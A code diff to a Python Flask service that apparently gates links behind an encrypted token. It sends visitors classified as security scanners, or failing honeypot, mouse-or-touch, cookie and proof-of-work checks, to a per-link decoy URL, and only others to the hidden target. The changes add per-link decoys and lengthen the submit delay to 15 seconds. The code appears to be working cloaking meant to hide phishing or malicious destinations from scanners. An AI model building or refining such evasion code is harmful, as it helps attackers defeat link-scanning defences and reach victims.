@@ -202,12 +202,10 @@ LANDING = """<!DOCTYPE html>
         <input type="hidden" name="t" value="{{ token }}">
         <input type="hidden" name="challenge" value="{{ challenge }}">
         <input type="hidden" name="pow_nonce" id="pow_nonce" value="">
-        <!-- Hidden field for user interaction -->
         <input type="hidden" name="user_interacted" id="user_interacted" value="false">
     </form>
 
     <script>
-        // Track mouse movement OR touch movement
         let interacted = false;
         function markInteraction() {
             if (!interacted) {
@@ -216,10 +214,7 @@ LANDING = """<!DOCTYPE html>
             }
         }
 
-        // Mouse events (Desktop)
         document.addEventListener('mousemove', markInteraction);
-        
-        // Touch events (Mobile/Tablet)
         document.addEventListener('touchstart', markInteraction, {passive: true});
         document.addEventListener('touchmove', markInteraction, {passive: true});
 
@@ -235,10 +230,9 @@ LANDING = """<!DOCTYPE html>
             }
             document.getElementById("pow_nonce").value = nonce;
             
-            // Wait 3 seconds before submitting
             setTimeout(() => { 
                 document.getElementById("challenge-form").submit(); 
-            }, 3000);
+            }, 15000);
         }
         window.onload = solveChallenge;
     </script>
@@ -264,11 +258,13 @@ def landing(token: str):
     if not data or "target" not in data:
         return _static_page("Invalid link", "Could not decrypt target.", 404)
 
+    # Use the unwanted URL from the payload, fallback to env var
+    unwanted = data.get("unwanted", UNWANTED_REDIRECT_URL)
+
     tag = classify(client_ip(), request.headers.get("User-Agent", ""))
     log.info(json.dumps({"event": "landing_get", **tag}))
 
     if tag["scanner"]:
-        unwanted = data.get("unwanted", UNWANTED_REDIRECT_URL)
         return redirect(unwanted, code=302)
 
     challenge_seed = secrets.token_hex(16)
@@ -287,43 +283,46 @@ def landing(token: str):
 
 @app.route("/submit/<path:token>", methods=["POST"])
 def execute(token: str):
+    # Decrypt payload early to get the specific unwanted URL for this link
+    data = unseal_payload(token)
+    if not data or "target" not in data:
+        # If it fails to decrypt, use the default env var
+        return redirect(UNWANTED_REDIRECT_URL, code=302)
+        
+    unwanted = data.get("unwanted", UNWANTED_REDIRECT_URL)
+
     tag = classify(client_ip(), request.headers.get("User-Agent", ""))
     
     if tag["scanner"]:
-        return redirect(UNWANTED_REDIRECT_URL, code=302)
+        return redirect(unwanted, code=302)
 
     if request.form.get("email_confirm_hp"):
-        return redirect(UNWANTED_REDIRECT_URL, code=302)
+        return redirect(unwanted, code=302)
         
-    # Check for interaction (mouse OR touch)
     if request.form.get("user_interacted") != "true":
-        return redirect(UNWANTED_REDIRECT_URL, code=302)
+        return redirect(unwanted, code=302)
 
     cookie_val = request.cookies.get("gate_session", "")
     if not cookie_val:
-        return redirect(UNWANTED_REDIRECT_URL, code=302)
+        return redirect(unwanted, code=302)
 
     try:
         nonce_data = cookie_serializer.loads(cookie_val, max_age=GATE_TTL)
     except Exception:
-        return redirect(UNWANTED_REDIRECT_URL, code=302)
+        return redirect(unwanted, code=302)
 
     if not hmac.compare_digest(nonce_data.get("t", ""), token):
-        return redirect(UNWANTED_REDIRECT_URL, code=302)
+        return redirect(unwanted, code=302)
 
     submitted_pow = request.form.get("pow_nonce", "")
     seed = nonce_data.get("challenge", "")
     
     if not seed or not submitted_pow:
-        return redirect(UNWANTED_REDIRECT_URL, code=302)
+        return redirect(unwanted, code=302)
         
     test_hash = hashlib.sha256((seed + submitted_pow).encode()).hexdigest()
     if not test_hash.startswith("0000"):
-        return redirect(UNWANTED_REDIRECT_URL, code=302)
-
-    data = unseal_payload(token)
-    if not data or "target" not in data:
-        return redirect(UNWANTED_REDIRECT_URL, code=302)
+        return redirect(unwanted, code=302)
 
     resp = make_response(redirect(data["target"], code=303))
     resp.delete_cookie("gate_session", path="/")
